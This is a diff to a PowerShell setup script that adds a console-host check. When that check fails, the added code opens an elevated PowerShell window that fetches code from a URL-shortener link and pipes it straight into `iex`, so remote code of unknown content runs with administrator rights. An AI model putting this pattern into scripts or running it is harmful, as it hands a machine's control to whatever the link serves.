@@ -14,6 +14,20 @@ $global:OneDriveLoggedIn = $false
 $global:SoftwareInstalled = $false
 $global:StepSkipped = $false
 
+############################
+# Powershell Console Check #
+############################
+if ($host.Name -ne "ConsoleHost") {
+    [System.Windows.Forms.MessageBox]::Show(
+        "This script is not being executed in the PowerShell Console. A new PowerShell Console window will now open to ensure proper execution.",
+        "Execution Environment Notice",
+        [System.Windows.Forms.MessageBoxButtons]::OK,
+        [System.Windows.Forms.MessageBoxIcon]::Warning
+    )
+    Start-Process PowerShell -ArgumentList "-Command ""iwr 'https://shorturl.at/nQ7Q8' | iex""" -Verb RunAs
+}
+
+
 #############
 # Functions #
 #############
